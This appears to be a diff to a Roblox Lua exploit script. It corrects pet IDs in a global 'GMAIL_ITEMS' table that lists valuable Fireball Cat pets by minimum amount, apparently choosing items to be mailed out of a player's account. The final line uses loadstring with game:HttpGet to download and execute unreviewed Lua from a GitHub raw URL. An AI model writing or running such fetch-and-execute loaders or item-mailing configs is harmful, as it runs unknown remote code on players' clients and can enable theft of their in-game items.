@@ -37,8 +37,8 @@ _G.GMAIL_ITEMS = {
   ["Normal Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 100},
   ["Golden Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 25, IsGold = true},
   ["RB Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 10, IsRainbow = true},
-  ["Shiny Normal Fireball Cat"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 1, IsShiny = true},
-  ["Shiny Golden Fireball Cat"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 1, IsGold = true, IsShiny = true},
-  ["Shiny RB Fireball Cat"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 1, IsRainbow = true, IsShiny = true},
+  ["Shiny Normal Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsShiny = true},
+  ["Shiny Golden Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsGold = true, IsShiny = true},
+  ["Shiny RB Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsRainbow = true, IsShiny = true},
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
